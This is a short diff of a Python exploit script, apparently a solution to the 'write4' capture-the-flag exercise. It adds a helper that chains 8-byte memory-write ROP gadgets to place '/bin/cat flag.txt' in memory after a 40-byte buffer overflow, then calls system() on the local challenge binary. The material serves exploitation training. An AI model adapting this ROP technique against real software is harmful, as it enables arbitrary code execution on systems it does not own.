@@ -110,13 +110,24 @@ def write8(toAddr, value):
     struct.pack("<Q", 0x400820), # mov qword ptr [r14], r15 ; ret
     ])
 
-# TBD
 def writeString(toAddr, string):
-    return "".join([
-    struct.pack("<Q", 0x0000000000401ab0), # pop rdi ; pop rsi ; pop rdx ; ret
-    ])
 
-payload = "A" * 40 + write8(dest_addr, '/bin//ls') + callSystem(dest_addr)
+    rop=""
+
+    # use 'write8' primitive
+    primUsed = 8
+
+    # calculate number of iterations needed
+    iterations = len(string) / primUsed
+
+    # write 'primUsed' long part of the 'string' at a time starting at 'toAddr' location
+    for i in xrange(iterations):
+        chunk = string[i*primUsed:i*primUsed + primUsed]
+        rop += write8(toAddr + i*primUsed, chunk)
+
+    return rop
+
+payload = "A" * 40 + writeString(dest_addr, '/bin/cat flag.txt\0\0\0\0\0\0\0') + callSystem(dest_addr)
 
 callme = os.popen('./write4', 'w')
 callme.write(payload)
